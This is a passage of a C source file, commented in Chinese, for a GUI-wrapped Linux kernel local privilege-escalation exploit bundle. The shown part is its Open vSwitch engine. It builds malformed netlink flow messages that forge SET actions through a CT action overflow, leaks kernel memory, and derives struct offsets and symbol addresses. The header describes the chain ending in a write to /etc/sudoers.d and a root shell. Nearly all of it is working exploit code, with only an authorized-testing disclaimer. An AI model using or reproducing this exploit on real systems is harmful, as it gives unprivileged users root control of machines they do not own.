/* ============================================================================
 *  dirtyfrag-gui.c — DirtyChains 十链本地提权 PoC
 *                    图形前端 + 内置引擎（单文件）
 *
 *  一个 .c 就能编出完整程序，不再需要额外的 .o，文件里合了五块：
 *
 *      OVS 引擎（原 ovswrap.c 全文）
 *          CVE-2026-64531 net/openvswitch CT action 越界，入口 ovswrap_main
 *      Fragnesia 引擎（上游 PoC 并入）
 *          CVE-2026-46300 xfrm/espintcp 页缓存改写，入口 fragnesia_main
 *      DirtyClone 引擎（上游 PoC 并入）
 *          CVE-2026-43503 xfrm/esp-over-udp 页缓存改写，入口 cve43503_main
 *      DirtyDecrypt 引擎（上游 PoC 并入）
 *          CVE-2026-31635 AF_RXRPC/rxgk 页缓存改写，入口 cve31635_main
 *      GTK3 前端（本项目前身 dirtyfrag-gui.c）
 *          十链下拉框 + pty 运行器 + ANSI 日志渲染，入口 main
 *
 *  编译（GUI）:
 *      gcc -O2 -Wall -o dirtychains dirtyfrag-gui.c \
 *          $(pkg-config --cflags --libs gtk+-3.0) -lutil
 *
 *  只编 OVS 命令行版（不含 GTK，不链接 gtk3）:
 *      gcc -O2 -Wall -DOVSWRAP_STANDALONE -o ovswrap dirtyfrag-gui.c
 *
 *  仅用于自有机器或明确授权的测试环境。
 * ==========================================================================*/

#ifdef OVSWRAP_STANDALONE
#define ovswrap_main main
#endif

/*
 * CVE-2026-64531  net/openvswitch：CT action 解析越界 -> 伪造 SET action
 *
 * 这是 ovswrap-poc.py 的 C 移植版，用于并进 GUI 的单二进制引擎。
 * 攻击面与 Python 原版完全一致：
 *
 *   非特权用户 -> unshare(CLONE_NEWUSER|CLONE_NEWNET)
 *              -> 在私有 netns 里建 OVS datapath（netlink generic）
 *              -> 用 CLONE 把 400 个 CT action 塞进一条 flow
 *              -> OVS_CT_ATTR_LABELS / OVS_CT_ATTR_TIMEOUT 溢出到下一个
 *                 action 的边界，被当成 OVS_ACTION_ATTR_SET 解析
 *              -> fake SET 里的 OVS_KEY_ATTR_TUNNEL_INFO 指向任意
 *                 ip_tunnel_info，读取时把目标内存回显到 tunnel key 里
 *              -> 写原语是 dst_release()：对伪造的 dst_entry 递减引用计数，
 *                 一次 -1，可以对 cred 的 fsuid/fsgid 连续递减到 0
 *              -> 被改成 root 身份的 host 子进程写 /etc/sudoers.d
 *              -> sudo -n bash
 *
 * 与 Python 版的差异：
 *   1. 808 条预置内核记录不再编进二进制，改成分目录的纯文本表
 *      offset/<N>系/<release>/target.h：换内核只要加一个目录，不用重编。
 *      命中配置表就不需要 BTF / pahole / System.map，没命中才动态推导。
 *   2. 不再 exec 自身进 namespace，直接 unshare(2)。
 *   3. 所有 netlink 报文用内存缓冲区拼，不再依赖 struct 序列化。
 *
 * 仅用于自有机器或明确授权的测试环境。
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <ctype.h>
#include <limits.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <net/if.h>
#include <pwd.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>

#define OVSWRAP_VERSION "0.1"

/* -------------------------------------------------------------------------
 * 常量
 * ---------------------------------------------------------------------- */

#define NLM_F_REQUEST 0x01
#define NLM_F_ACK     0x04
#define NLM_F_CREATE  0x400
#define NETLINK_GENERIC 16
#define GENL_ID_CTRL  0x10
#define CTRL_CMD_GETFAMILY 3
#define CTRL_ATTR_FAMILY_ID 1
#define CTRL_ATTR_FAMILY_NAME 2

#define OVS_DATAPATH_VERSION 2
#define OVS_FLOW_VERSION 1

#define OVS_DP_CMD_NEW 1
#define OVS_DP_ATTR_NAME 1
#define OVS_DP_ATTR_UPCALL_PID 2
#define OVS_DP_ATTR_USER_FEATURES 5

#define OVS_FLOW_CMD_NEW 1
#define OVS_FLOW_CMD_DEL 2
#define OVS_FLOW_CMD_GET 3
#define OVS_FLOW_ATTR_KEY 1
#define OVS_FLOW_ATTR_ACTIONS 2

#define OVS_KEY_ATTR_IN_PORT 3
#define OVS_KEY_ATTR_ETHERNET 4
#define OVS_KEY_ATTR_ETHERTYPE 6
#define OVS_KEY_ATTR_IPV4 7
#define OVS_KEY_ATTR_TCP 9
#define OVS_KEY_ATTR_TUNNEL 16
#define OVS_KEY_ATTR_TCP_FLAGS 18
/* 默认值；配置表给出别的值时用表里的（历史版本是 29） */
#define OVS_KEY_ATTR_TUNNEL_INFO 31

#define OVS_ACTION_ATTR_OUTPUT 1
#define OVS_ACTION_ATTR_SET 3
#define OVS_ACTION_ATTR_POP_VLAN 5
#define OVS_ACTION_ATTR_CT 12
#define OVS_ACTION_ATTR_CLONE 20

#define OVS_CT_ATTR_COMMIT 1
#define OVS_CT_ATTR_LABELS 4
#define OVS_CT_ATTR_HELPER 5
#define OVS_CT_ATTR_TIMEOUT 9

#define OVS_TUNNEL_KEY_ATTR_IPV4_SRC 1
#define OVS_TUNNEL_KEY_ATTR_IPV4_DST 2
#define OVS_TUNNEL_KEY_ATTR_TOS 3
#define OVS_TUNNEL_KEY_ATTR_TTL 4
#define OVS_TUNNEL_KEY_ATTR_TP_SRC 9
#define OVS_TUNNEL_KEY_ATTR_TP_DST 10
#define OVS_TUNNEL_KEY_ATTR_IPV4_INFO_BRIDGE 16

#ifndef ETH_P_IP
#define ETH_P_IP 0x0800
#endif
#ifndef IPPROTO_TCP
#define IPPROTO_TCP 6
#endif
#define CT_ACTION_COUNT 400
#define NLA_HDR_LEN 4

#define BTF_VMLINUX "/sys/kernel/btf/vmlinux"

/* -------------------------------------------------------------------------
 * 日志：和 GUI 的 ANSI 解析器保持同一套颜色
 * ---------------------------------------------------------------------- */

static int g_color = 1;
/* fake SET 里 OVS_KEY_ATTR_TUNNEL_INFO 的 attr id：配置表命中时会被改写 */
static int g_tun_info = OVS_KEY_ATTR_TUNNEL_INFO;

#define C_RST "\033[0m"
#define C_DIM "\033[2m"
#define C_CYA "\033[36m"
#define C_GRN "\033[32m"
#define C_YEL "\033[33m"
#define C_RED "\033[31m"
#define C_MAG "\033[35m"

static void pr_raw(const char *fmt, ...)
{
    va_list ap;

    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    fflush(stdout);
}

static void pr_dim(const char *fmt, ...)
{
    va_list ap;

    if (g_color)
        fputs(C_DIM, stdout);
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    if (g_color)
        fputs(C_RST, stdout);
    fflush(stdout);
}

static void pr_err(const char *fmt, ...)
{
    va_list ap;

    if (g_color)
        fputs(C_RED, stdout);
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    if (g_color)
        fputs(C_RST, stdout);
    fflush(stdout);
}

static void pr_ok(const char *fmt, ...)
{
    va_list ap;

    if (g_color)
        fputs(C_GRN, stdout);
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    if (g_color)
        fputs(C_RST, stdout);
    fflush(stdout);
}

static void pr_step(const char *fmt, ...)
{
    va_list ap;

    pr_raw("\n");
    if (g_color)
        fputs(C_MAG "***" C_RST, stdout);
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    if (g_color)
        fputs(C_MAG "***" C_RST "\n", stdout);
    else
        pr_raw("\n");
    fflush(stdout);
}

/* -------------------------------------------------------------------------
 * 动态缓冲区：所有 netlink 报文都拼在这里
 * ---------------------------------------------------------------------- */

struct buf {
    unsigned char *p;
    size_t len;
    size_t cap;
};

static void buf_init(struct buf *b, size_t cap)
{
    b->p = malloc(cap);
    b->len = 0;
    b->cap = b->p ? cap : 0;
}

static void buf_free(struct buf *b)
{
    free(b->p);
    b->p = NULL;
    b->len = b->cap = 0;
}

static int buf_reserve(struct buf *b, size_t extra)
{
    size_t need = b->len + extra;

    if (need <= b->cap)
        return 0;
    while (b->cap < need)
        b->cap = b->cap ? b->cap * 2 : 4096;
    b->p = realloc(b->p, b->cap);
    return b->p ? 0 : -1;
}

static void buf_put(struct buf *b, const void *data, size_t len)
{
    if (buf_reserve(b, len) != 0)
        return;
    memcpy(b->p + b->len, data, len);
    b->len += len;
}

static void buf_u16(struct buf *b, uint16_t v)
{
    buf_put(b, &v, 2);
}

static void buf_u32(struct buf *b, uint32_t v)
{
    buf_put(b, &v, 4);
}

static void buf_align4(struct buf *b)
{
    static const unsigned char zero[4];

    while (b->len & 3)
        buf_put(b, zero, 1);
}

/* 追加一个 netlink attribute，长度自动回填 */
static size_t nla_put(struct buf *b, uint16_t type, const void *data, size_t len)
{
    size_t start = b->len;
    uint16_t total = (uint16_t)(NLA_HDR_LEN + len);

    buf_u16(b, total);
    buf_u16(b, type);
    if (len)
        buf_put(b, data, len);
    buf_align4(b);
    return start;
}

/* 嵌套 attribute：先占 4 字节，填完再回填长度 */
static size_t nla_nest_start(struct buf *b, uint16_t type)
{
    size_t start = b->len;

    buf_u16(b, 0);
    buf_u16(b, type);
    return start;
}

static void nla_nest_end(struct buf *b, size_t start)
{
    uint16_t total = (uint16_t)(b->len - start);

    memcpy(b->p + start, &total, 2);
    buf_align4(b);
}

/* -------------------------------------------------------------------------
 * generic netlink
 * ---------------------------------------------------------------------- */

struct genl {
    int fd;
    uint32_t seq;
};

static int genl_open(struct genl *g)
{
    struct sockaddr_nl sa;

    g->fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (g->fd < 0)
        return -1;
    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;
    if (bind(g->fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(g->fd);
        g->fd = -1;
        return -1;
    }
    g->seq = 1;
    return 0;
}

/*
 * 发一条 generic netlink 请求并取回所有同 seq 的应答。
 * ack_mode: 1 = 期待 NLMSG_ERROR(0) 才算完成（NLM_F_ACK）
 */
static int genl_xchg(struct genl *g, int family, uint8_t cmd, uint8_t version,
                     const void *payload, size_t plen, int flags,
                     struct buf *reply)
{
    struct buf msg;
    struct nlmsghdr *nh;
    struct genlmsghdr {
        uint8_t cmd;
        uint8_t version;
        uint16_t reserved;
    } gh;
    uint32_t seq = g->seq++;
    unsigned char rx[1 << 16];
    int want_ack = (flags & NLM_F_ACK) != 0;
    int got_any = 0;

    if (reply)
        reply->len = 0;

    buf_init(&msg, 64 + plen);
    if (!msg.p) {
        buf_free(&msg);
        return -ENOMEM;
    }

    buf_u32(&msg, 0);                      /* len 稍后回填 */
    buf_u16(&msg, (uint16_t)family);
    buf_u16(&msg, (uint16_t)flags);
    buf_u32(&msg, seq);
    buf_u32(&msg, 0);

    gh.cmd = cmd;
    gh.version = version;
    gh.reserved = 0;
    buf_put(&msg, &gh, sizeof(gh));
    if (plen)
        buf_put(&msg, payload, plen);

    {
        uint32_t total = (uint32_t)msg.len;

        memcpy(msg.p, &total, 4);
    }

    nh = (struct nlmsghdr *)msg.p;
    (void)nh;

    if (send(g->fd, msg.p, msg.len, 0) < 0) {
        int e = errno;

        buf_free(&msg);
        return -e;
    }
    buf_free(&msg);

    for (;;) {
        ssize_t n = recv(g->fd, rx, sizeof(rx), 0);
        size_t off = 0;

        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -errno;
        }

        while (off + 16 <= (size_t)n) {
            const struct nlmsghdr *h = (const struct nlmsghdr *)(rx + off);
            size_t mlen = h->nlmsg_len;
            const unsigned char *body;
            size_t blen;

            if (mlen < 16 || off + mlen > (size_t)n)
                break;
            if (h->nlmsg_seq != seq) {
                off += NLMSG_ALIGN(mlen);
                continue;
            }

            body = rx + off + 16;
            blen = mlen - 16;

            if (h->nlmsg_type == NLMSG_ERROR) {
                int err = 0;

                if (blen >= 4)
                    memcpy(&err, body, 4);
                if (err == 0) {
                    if (want_ack || got_any)
                        return 0;
                    return 0;
                }
                return err;            /* 负数 errno */
            }

            if (reply && h->nlmsg_type != NLMSG_NOOP)
                buf_put(reply, body, blen);
            got_any = 1;
            off += NLMSG_ALIGN(mlen);
        }

        /* 不带 ACK 的请求：收到一条应答就可以返回 */
        if (!want_ack && got_any)
            return 0;
    }
}

static int genl_get_family(struct genl *g, const char *name, int *out)
{
    struct buf payload, reply;
    int ret;

    buf_init(&payload, 64);
    buf_init(&reply, 4096);
    if (!payload.p || !reply.p) {
        buf_free(&payload);
        buf_free(&reply);
        return -ENOMEM;
    }

    nla_put(&payload, CTRL_ATTR_FAMILY_NAME, name, strlen(name) + 1);

    ret = genl_xchg(g, GENL_ID_CTRL, CTRL_CMD_GETFAMILY, 2,
                    payload.p, payload.len, NLM_F_REQUEST, &reply);
    buf_free(&payload);
    if (ret < 0) {
        buf_free(&reply);
        return ret;
    }

    /* reply 是 genlmsghdr(4) + attrs */
    {
        size_t off = 4;
        int found = 0;

        while (off + 4 <= reply.len) {
            uint16_t alen, atype;

            memcpy(&alen, reply.p + off, 2);
            memcpy(&atype, reply.p + off + 2, 2);
            if (alen < 4 || off + alen > reply.len)
                break;
            if (atype == CTRL_ATTR_FAMILY_ID && alen >= 6) {
                uint16_t id;

                memcpy(&id, reply.p + off + 4, 2);
                *out = id;
                found = 1;
                break;
            }
            off += (alen + 3) & ~3u;
        }
        buf_free(&reply);
        return found ? 0 : -ENOENT;
    }
}

/* -------------------------------------------------------------------------
 * OVS 报文构造
 * ---------------------------------------------------------------------- */

/* 一条 flow 的 key：固定 IPv4/TCP 五元组，seq 只用来避免重复 */
static void flow_key(struct buf *out, int seq)
{
    /*
     * netlink 属性里的多字节字段一律要求网络序: 内核侧 nla_get_be16/32 只是
     * 做类型转换, 不交换字节。这里直接放主机序会被读成反序 —— 例如
     * ETH_P_IP(0x0800) 变成 0x0008, OVS 校验 "EtherType 8 is less than
     * min 600" 后返回 -EINVAL。
     */
    uint32_t src = htonl(0x0A000000u | (uint32_t)((seq & 0xFFFF) + 1));
    uint32_t dst = htonl(0x0A0000FEu);
    uint16_t sport = htons((uint16_t)(10000 + (seq % 50000)));
    uint16_t dport = htons(443);
    uint16_t ethertype = htons(ETH_P_IP);
    uint16_t tcpflags = 0;
    uint32_t in_port = 0;
    unsigned char eth[12] = { 0x02, 0, 0, 0, 0, 1, 0x02, 0, 0, 0, 0, 2 };
    unsigned char ipv4[12];
    unsigned char tcp[4];

    memcpy(ipv4 + 0, &src, 4);
    memcpy(ipv4 + 4, &dst, 4);
    ipv4[8] = IPPROTO_TCP;
    ipv4[9] = 0;
    ipv4[10] = 64;
    ipv4[11] = 0;

    memcpy(tcp + 0, &sport, 2);
    memcpy(tcp + 2, &dport, 2);

    nla_put(out, OVS_KEY_ATTR_IN_PORT, &in_port, 4);
    nla_put(out, OVS_KEY_ATTR_ETHERNET, eth, sizeof(eth));
    nla_put(out, OVS_KEY_ATTR_ETHERTYPE, &ethertype, 2);
    nla_put(out, OVS_KEY_ATTR_IPV4, ipv4, sizeof(ipv4));
    nla_put(out, OVS_KEY_ATTR_TCP, tcp, sizeof(tcp));
    nla_put(out, OVS_KEY_ATTR_TCP_FLAGS, &tcpflags, 2);
}

/* OVS_ACTION_ATTR_CT{ COMMIT, extra... } */
static void ct_action(struct buf *out, const void *extra, size_t elen)
{
    size_t nest = nla_nest_start(out, OVS_ACTION_ATTR_CT);

    nla_put(out, OVS_CT_ATTR_COMMIT, NULL, 0);
    if (elen)
        buf_put(out, extra, elen);
    nla_nest_end(out, nest);
}

/*
 * helper 泄漏：labels 里塞一个假的 OUTPUT action（len=512），
 * 后面紧跟 400 个 CT{COMMIT, HELPER}。OVS 解析 labels 时会把
 * 紧邻内存当成 action 链继续读，fake OUTPUT 的 512 字节 payload
 * 就会被原样回显到 flow get 的应答里 —— 里面是 nf_conntrack_helper。
 */
static void clone_with_helper_leak(struct buf *out, const void *fake, size_t flen,
                                   int ct_count)
{
    unsigned char labels[32];
    unsigned char helper_attr[8] = { 8, 0, OVS_CT_ATTR_HELPER, 0, 'f', 't', 'p', 0 };
    struct buf extra;
    size_t nest;
    int i;

    if (ct_count < 2)
        ct_count = 2;

    memset(labels, 0, sizeof(labels));
    if (flen > 32 - 20)
        flen = 32 - 20;
    memcpy(labels + 20, fake, flen);

    buf_init(&extra, 128);
    nla_put(&extra, OVS_CT_ATTR_LABELS, labels, sizeof(labels));
    nla_put(&extra, OVS_CT_ATTR_HELPER, helper_attr + 4, 4);   /* "ftp\0" */

    nest = nla_nest_start(out, OVS_ACTION_ATTR_CLONE);
    ct_action(out, extra.p, extra.len);
    for (i = 1; i < ct_count; i++)
        ct_action(out, helper_attr, sizeof(helper_attr));
    nla_nest_end(out, nest);
    buf_free(&extra);
}

/*
 * fake SET 载体 A：CT_ATTR_TIMEOUT。
 * timeout attr 的 32 字节 payload 里，前 4 字节会落到 "下一个 action" 的
 * nlattr 头上：len=0xFFFF, type=OVS_ACTION_ATTR_SET，于是解析器把后面的
 * 32 字节当成一个 SET，里面再套 TUNNEL_INFO(len=12)，指向 tun_dst。
 */
static void clone_with_fake_set_timeout(struct buf *out, uint64_t tun_dst)
{
    unsigned char labels[32];
    unsigned char timeout[32];
    struct buf extra;
    size_t nest;
    int i;

    memset(labels, 0, sizeof(labels));
    memset(timeout, 0, sizeof(timeout));

    /* labels[20..24] = {len=0xffff, type=SET} */
    labels[20] = 0xFF;
    labels[21] = 0xFF;
    labels[22] = OVS_ACTION_ATTR_SET;
    labels[23] = 0;
    /* labels[24..28] = {len=12, type=TUNNEL_INFO} */
    labels[24] = 12;
    labels[25] = 0;
    labels[26] = (unsigned char)g_tun_info;
    labels[27] = 0;
    /* labels[28..32] = tun_dst 低 32 位 */
    memcpy(labels + 28, &tun_dst, 4);

    /* timeout[0..4] = tun_dst 高 32 位 */
    memcpy(timeout, (const unsigned char *)&tun_dst + 4, 4);

    buf_init(&extra, 1024);
    nla_put(&extra, OVS_CT_ATTR_LABELS, labels, sizeof(labels));
    nla_put(&extra, OVS_CT_ATTR_TIMEOUT, timeout, sizeof(timeout));

    nest = nla_nest_start(out, OVS_ACTION_ATTR_CLONE);
    ct_action(out, extra.p, extra.len);
    for (i = 1; i < CT_ACTION_COUNT; i++)
        ct_action(out, NULL, 0);
    nla_nest_end(out, nest);
    buf_free(&extra);
}

/* labels-only 计划的参数：把 total_ct 和 padding 数量算出来 */
static int labels_only_plan(int ct_action_len, int labels_off,
                            int *total_out, int *pad_out)
{
    int fake_offset = 16;
    int target_wrap;
    int best_score = -1, best_total = 0, best_pad = 0;
    int n;

    if (ct_action_len < 8 || (ct_action_len & 3))
        return -1;

    target_wrap = 8 + labels_off + fake_offset;
    if (target_wrap >= 0x10000 || (target_wrap & 3))
        return -1;

    for (n = 360; n <= 420; n++) {
        int base_wrap = (4 + n * ct_action_len) & 0xFFFF;
        int diff = (target_wrap - base_wrap) & 0xFFFF;
        int pad_count = diff / 4;
        int true_len = 4 + n * ct_action_len + pad_count * 4;
        int score;

        if (true_len <= 0xFFFF || pad_count > 256)
            continue;
        score = pad_count + abs(n - 400);
        if (best_score < 0 || score < best_score) {
            best_score = score;
            best_total = n;
            best_pad = pad_count;
        }
    }

    if (best_score < 0)
        return -1;
    *total_out = best_total;
    *pad_out = best_pad;
    return 0;
}

/*
 * fake SET 载体 B：只用 LABELS。
 * 这里不靠"下一个 attr"，而是让整个 clone 的 action 总长度超过 0xFFFF，
 * 被内核截断成 16 位长度后回绕到 labels 内部，fake SET 正好落在
 * labels+16 的位置。补若干个 POP_VLAN 把长度凑到目标回绕点。
 */
static void clone_with_fake_set_labels_only(struct buf *out, uint64_t tun_dst,
                                            int ct_action_len, int labels_off)
{
    int total = 0, pad = 0;
    int fake_offset = 16;
    unsigned char labels[32];
    struct buf extra;
    size_t nest;
    int i;

    if (labels_only_plan(ct_action_len, labels_off, &total, &pad) != 0)
        return;

    memset(labels, 0, sizeof(labels));
    labels[fake_offset + 0] = 0xFF;
    labels[fake_offset + 1] = 0xFF;
    labels[fake_offset + 2] = OVS_ACTION_ATTR_SET;
    labels[fake_offset + 3] = 0;
    labels[fake_offset + 4] = 12;
    labels[fake_offset + 5] = 0;
    labels[fake_offset + 6] = (unsigned char)g_tun_info;
    labels[fake_offset + 7] = 0;
    memcpy(labels + fake_offset + 8, &tun_dst, 8);

    buf_init(&extra, 64);
    nla_put(&extra, OVS_CT_ATTR_LABELS, labels, sizeof(labels));

    nest = nla_nest_start(out, OVS_ACTION_ATTR_CLONE);
    ct_action(out, extra.p, extra.len);
    for (i = 1; i < total; i++)
        ct_action(out, NULL, 0);
    for (i = 0; i < pad; i++)
        nla_put(out, OVS_ACTION_ATTR_POP_VLAN, NULL, 0);
    nla_nest_end(out, nest);
    buf_free(&extra);
}

enum carrier {
    CARRIER_TIMEOUT = 0,
    CARRIER_LABELS_ONLY = 1,
    CARRIER_AUTO = 2,
};

static void clone_with_fake_set(struct buf *out, int carrier, uint64_t tun_dst,
                                int ct_action_len, int labels_off)
{
    if (carrier == CARRIER_TIMEOUT)
        clone_with_fake_set_timeout(out, tun_dst);
    else
        clone_with_fake_set_labels_only(out, tun_dst, ct_action_len, labels_off);
}

/* -------------------------------------------------------------------------
 * 内核偏移：pahole 读 BTF，符号读 kallsyms / System.map
 * ---------------------------------------------------------------------- */

struct koffs {
    unsigned long vmlinux_module_ktype;   /* module_ktype - _text */
    unsigned long vmlinux_init_pid_ns;    /* init_pid_ns  - _text */

    int nf_conntrack_helper_me;
    int module_kobj_ktype;
    int task_pid;
    int task_cred;
    int task_pid_links;
    int cred_fsuid;
    int cred_fsgid;
    int cred_cap_permitted;
    int cred_cap_effective;
    int pid_namespace_idr;
    int idr_idr_rt;
    int idr_base;
    int xarray_xa_head;
    int xa_node_shift;
    int xa_node_slots;
    int pid_tasks;
    int hlist_head_first;
    int dst_entry_ref;
    int ref_kind;                  /* 0 = __rcuref, 1 = __refcnt */
    int metadata_dst_tun_info;
    int ip_tunnel_key_ipv4_src;
    int ip_tunnel_key_ipv4_dst;
    int ip_tunnel_key_tos;
    int ip_tunnel_key_ttl;
    int ip_tunnel_key_tp_src;
    int ip_tunnel_key_tp_dst;
    int ovs_ct_labels;
    int ovs_ct_action_len;
};

static int g_verbose;

static int run_cmd(const char *cmd, char *out, size_t outlen)
{
    FILE *f;
    size_t n;

    f = popen(cmd, "r");
    if (!f)
        return -1;
    n = fread(out, 1, outlen - 1, f);
    out[n] = '\0';
    pclose(f);
    return (int)n;
}

static int have_binary(const char *name)
{
    const char *path = getenv("PATH");
    char buf[1024];
    const char *p;

    if (!path)
        path = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";

    p = path;
    while (*p) {
        const char *q = strchr(p, ':');
        size_t len = q ? (size_t)(q - p) : strlen(p);

        if (len && len < sizeof(buf) - 64) {
            snprintf(buf, sizeof(buf), "%.*s/%s", (int)len, p, name);
            if (access(buf, X_OK) == 0)
                return 1;
        }
        if (!q)
            break;
        p = q + 1;
    }
    return 0;
}

/*
 * pahole -C <type> <btf> 的输出里，字段行形如：
 *      int                        pid;                  / *     0     4 * /
 * 我们只要这条注释里的第一个数。
 */
static int parse_field_offset(const char *text, const char *type,
                              const char *field, int *out)
{
    const char *line = text;
    size_t flen = strlen(field);

    (void)type;

    while (line && *line) {
        const char *nl = strchr(line, '\n');
        size_t len = nl ? (size_t)(nl - line) : strlen(line);
        char tmp[512];
        const char *hit = NULL;
        const char *p;

        if (len >= sizeof(tmp))
            len = sizeof(tmp) - 1;
        memcpy(tmp, line, len);
        tmp[len] = '\0';

        /* 在行内找 field，且前后必须是"标识符边界" */
        for (p = tmp; (p = strstr(p, field)) != NULL; p += flen) {
            char before = (p == tmp) ? ' ' : p[-1];
            char after = p[flen];

            if ((before == ' ' || before == '\t' || before == '*' ||
                 before == ')' || before == '(') &&
                (after == ';' || after == '[' || after == ')' ||
                 after == ' ' || after == '\t')) {
                hit = p;
                break;
            }
        }

        if (hit && strstr(tmp, "/*")) {
            const char *c = strstr(tmp, "/*");
            int off = -1, size = -1;

            if (sscanf(c, "/* %d %d", &off, &size) == 2 && off >= 0) {
                *out = off;
                return 0;
            }
        }

        line = nl ? nl + 1 : NULL;
    }
    return -1;
}

/*
 * 结构体可能不在 vmlinux 里：nf_conntrack_helper 在 nf_conntrack 模块，
 * ovs_conntrack_info 在 openvswitch 模块。所以按 vmlinux -> btf 目录下
 * 每个模块文件的顺序挨个试，记住上次命中的文件，下次先试它。
 */
#define BTF_DIR "/sys/kernel/btf"
#define BTF_MAX 320

static char g_btf_paths[BTF_MAX][256];
static int g_btf_count;
static int g_btf_pref = -1;

static void btf_collect(void)
{
    DIR *d;
    struct dirent *e;
    char release[128], path[256];

    if (g_btf_count)
        return;

    snprintf(g_btf_paths[g_btf_count++], 256, "%s", BTF_VMLINUX);

    d = opendir(BTF_DIR);
    if (d) {
        while ((e = readdir(d)) != NULL && g_btf_count < BTF_MAX) {
            if (e->d_name[0] == '.' || !strcmp(e->d_name, "vmlinux"))
                continue;
            snprintf(g_btf_paths[g_btf_count++], 256, "%s/%.200s", BTF_DIR, e->d_name);
        }
        closedir(d);
    }

    if (run_cmd("uname -r", release, sizeof(release)) > 0) {
        release[strcspn(release, "\n")] = '\0';
        snprintf(path, sizeof(path), "/boot/vmlinux-%s", release);
        if (access(path, R_OK) == 0 && g_btf_count < BTF_MAX)
            snprintf(g_btf_paths[g_btf_count++], 256, "%s", path);
        snprintf(path, sizeof(path), "/usr/lib/debug/boot/vmlinux-%s", release);
        if (access(path, R_OK) == 0 && g_btf_count < BTF_MAX)
            snprintf(g_btf_paths[g_btf_count++], 256, "%s", path);
    }
}

static int pahole_dump(const char *type, char *out, size_t outlen)
{
    char cmd[1024];
    int i, tried = 0;

    btf_collect();

    for (i = -1; i < g_btf_count; i++) {
        int idx = (i < 0) ? g_btf_pref : i;

        if (idx < 0 || idx >= g_btf_count)
            continue;
        if (i >= 0 && idx == g_btf_pref)
            continue;               /* 刚才已经试过 */
        tried++;

        snprintf(cmd, sizeof(cmd), "pahole -C %s %s 2>/dev/null",
                 type, g_btf_paths[idx]);
        if (run_cmd(cmd, out, outlen) <= 0)
            continue;
        if (!strstr(out, "struct ") && !strstr(out, "union "))
            continue;
        g_btf_pref = idx;
        return 0;
    }

    if (!tried)
        return -1;
    return -1;
}

static int koff_field(const char *type, const char *field, int *out)
{
    static char text[1 << 16];
    static char cached_type[64];
    static int cached = -1;

    if (!cached_type[0] || strcmp(cached_type, type)) {
        cached = pahole_dump(type, text, sizeof(text));
        snprintf(cached_type, sizeof(cached_type), "%s", type);
    }
    if (cached != 0) {
        pr_err("  pahole 读不到 struct %s（%s）\n", type, BTF_VMLINUX);
        return -1;
    }
    if (parse_field_offset(text, type, field, out) != 0) {
        pr_err("  struct %s 里找不到字段 %s\n", type, field);
        return -1;
    }
    return 0;
}

static int koff_struct_size(const char *type, int *out)
{
    static char text[1 << 16];
    const char *p;

    if (pahole_dump(type, text, sizeof(text)) != 0) {
        pr_err("  pahole 读不到 struct %s\n", type);
        return -1;
    }
    p = strstr(text, "size:");
    if (!p || sscanf(p, "size: %d", out) != 1) {
        pr_err("  struct %s 的 size 解析失败\n", type);
        return -1;
    }
    return 0;
}

/* 从 kallsyms / System.map 取三个符号的绝对地址 */
static int read_symbol_triplet(const char *path, unsigned long *text,
                               unsigned long *mtype, unsigned long *pidns)
{
    FILE *f = fopen(path, "r");
    char line[512];
    int got = 0;

    if (!f)
        return -1;

    *text = *mtype = *pidns = 0;

    while (fgets(line, sizeof(line), f)) {
        unsigned long addr;
        char type, name[256];

        if (sscanf(line, "%lx %c %255s", &addr, &type, name) != 3)
            continue;
        if (!strcmp(name, "_text")) {
            *text = addr;
            got |= 1;
        } else if (!strcmp(name, "module_ktype")) {
            *mtype = addr;
            got |= 2;
        } else if (!strcmp(name, "init_pid_ns")) {
            *pidns = addr;
            got |= 4;
        }
        if (got == 7)
            break;
    }
    fclose(f);

    if (got != 7 || !*text || !*mtype || !*pidns)
        return -1;
    return 0;
}

static int derive_symbols(struct koffs *k)
{
    char release[128];
    char path[512];
    unsigned long text = 0, mtype = 0, pidns = 0;
    static const char *fixed[] = {
        "/boot/System.map", "/proc/kallsyms",
    };
    int i;

    {
        char cmd[256];

        if (run_cmd("uname -r", release, sizeof(release)) <= 0)
            return -1;
        release[strcspn(release, "\n")] = '\0';
        (void)cmd;
    }

    snprintf(path, sizeof(path), "/boot/System.map-%s", release);
    if (read_symbol_triplet(path, &text, &mtype, &pidns) == 0)
        goto done;

    for (i = 0; i < (int)(sizeof(fixed) / sizeof(fixed[0])); i++) {
        if (read_symbol_triplet(fixed[i], &text, &mtype, &pidns) == 0)
            goto done;
    }

    snprintf(path, sizeof(path), "/usr/lib/debug/boot/System.map-%s", release);
    if (read_symbol_triplet(path, &text, &mtype, &pidns) == 0)
        goto done;

    snprintf(path, sizeof(path), "/lib/modules/%s/build/System.map", release);
    if (read_symbol_triplet(path, &text, &mtype, &pidns) == 0)
        goto done;

    return -1;

done:
    if (mtype <= text || pidns <= text) {
        pr_err("  符号地址异常：_text=0x%lx module_ktype=0x%lx init_pid_ns=0x%lx\n",
               text, mtype, pidns);
        return -1;
    }
    k->vmlinux_module_ktype = mtype - text;
    k->vmlinux_init_pid_ns = pidns - text;
    return 0;
}

/* -------------------------------------------------------------------------
 * 偏移配置表的命中状态
 *
 * 表在 offset/<N>系/<release>/target.h，由 -dump-target 生成、th_load() 解析。
